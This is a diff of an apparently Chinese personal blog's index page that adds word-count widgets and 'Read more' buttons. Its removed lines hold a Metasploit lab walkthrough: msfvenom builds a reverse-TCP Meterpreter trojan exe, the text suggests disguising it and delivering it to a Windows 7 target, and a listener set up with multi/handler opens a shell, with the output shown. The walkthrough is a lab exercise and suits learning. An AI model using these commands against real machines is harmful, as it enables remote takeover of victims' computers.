+          <h1 id="Linux-CentOS-7-命令行模式安装VMware-Tools-详解"><a href="#Linux-CentOS-7-命令行模式安装VMware-Tools-详解" class="headerlink" title="Linux(CentOS 7)命令行模式安装VMware Tools 详解"></a>Linux(CentOS 7)命令行模式安装VMware Tools 详解</h1><p>本例中为在Linux（以CentOS 7为例）安装VMware Tools。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/10/CentOS-7/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2889,6 +1576,15 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     20 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     1 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -2934,6 +1630,37 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  20
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
 
           
 
@@ -2951,11 +1678,15 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
 
       
         
-          
-            <p>记录第一个中危漏</p>
+          <p>记录第一个中危漏</p>
 <p>携程XSS 漏洞  漏洞编号vulbox-2019-0201455</p>
-<h2 id><a href="#" class="headerlink" title></a><img src="/09/SRC/C:%5CUsers%5CLENOVO%5Cmyblog%5Csource_posts%5CSRC%5C1.png" alt></h2>
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/09/SRC/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -3010,6 +1741,15 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     809 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     3 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -3055,6 +1795,37 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  809
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  3
+                </span>
+              
+            </div>
+          
 
           
 
@@ -3072,76 +1843,17 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
 
       
         
-          
-            <h2 id="后门简介"><a href="#后门简介" class="headerlink" title="后门简介"></a>后门简介</h2><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。</p>
+          <h2 id="后门简介"><a href="#后门简介" class="headerlink" title="后门简介"></a>后门简介</h2><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。</p>
 <hr>
 <h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>Kali linux ip 192.168.10.128  </p>
 <p>WIN7 ip 10.0.2.2 </p>
-<hr>
-<p>选择以下攻击载荷并生成一个exe的木马程序</p>
-<p>命令msfconsole 开启Metasploit</p>
-<p>查看payload，使用命令show payloads，msf提供了多种攻击载荷</p>
-<p>选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序</p>
-<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe</p>
-<p>其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下</p>
-<hr>
-<p><strong>使用命令 cd /，可以看到我们生成的exe文件</strong></p>
-<hr>
-<p>接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。</p>
-<hr>
-<p>为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。</p>
-<p>在kali linux上打开ssh服务的方法：</p>
-<p>apt-get install openssh-server#安装</p>
-<p>一、配置SSH参数</p>
-<p>修改sshd_config文件，命令为：</p>
-<p>vi /etc/ssh/sshd_config</p>
-<p>将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes</p>
-<p>右击桌面，单击打开终端，输入命令</p>
-<p>将PermitRootLogin without-password修改为</p>
-<p>PermitRootLogin yes</p>
-<p>二、启动SSH服务</p>
-<p>命令为：</p>
-<p>/etc/init.d/ssh start</p>
-<p>或者</p>
-<p>service ssh start</p>
-<p>查看SSH服务状态是否正常运行，命令为</p>
-<p>/etc/init.d/ssh status</p>
-<p>或者service ssh status</p>
-<p>那么需要生成两个密钥：</p>
-<p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</p>
-<p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key</p>
-<p>执行命令后都会让输入密码，直接敲回车设置为空即可</p>
-<hr>
-<p><strong>Win7关闭防火墙的方法</strong></p>
-<hr>
-<p>接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128  ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。</p>
-<hr>
-<p>在msf中设置监听</p>
-<p>use exploit/multi/handler </p>
-<p>show options </p>
-<p>设置我们后门生成时的攻击载荷</p>
-<p>set payload windows/meterpreter/reverse_tcp</p>
-<p>show options </p>
-<p>set payload windows/meterpreter/reverse_tcp</p>
-<p>payload =&gt; windows/meterpreter/reverse_tcp</p>
-<hr>
-<p>设置参数（与后门的参数相对应）</p>
-<p>msf exploit(multi/handler) &gt; set LHOST 192.168.10.128</p>
-<p>LHOST =&gt; 192.168.10.128</p>
-<p>msf exploit(multi/handler) &gt; set LPORT 4444</p>
-<p>LPORT =&gt; 4444</p>
-<p>msf exploit(multi/handler) &gt; run</p>
-<hr>
-<p>在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程</p>
-<p>序时，会弹回一个shell</p>
-<p>[*] Started reverse TCP handler on 192.168.10.128:4444 </p>
-<p>[*] Sending stage (179779 bytes) to 192.168.10.1</p>
-<p>[*] Sleeping before handling stage…</p>
-<p>[*] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800</p>
-<hr>
-<hr>
-<h3 id="实验结束"><a href="#实验结束" class="headerlink" title="实验结束"></a>实验结束</h3>
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/09/metasploit/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -3239,10 +1951,10 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
               
               
               <div class="site-state-item site-state-tags">
-                
+                <a href="/tags/index.html">
                   <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -3315,7 +2027,7 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count"></span>
+    <span title="Site words total count">47.4k</span>
   
 </div>
 
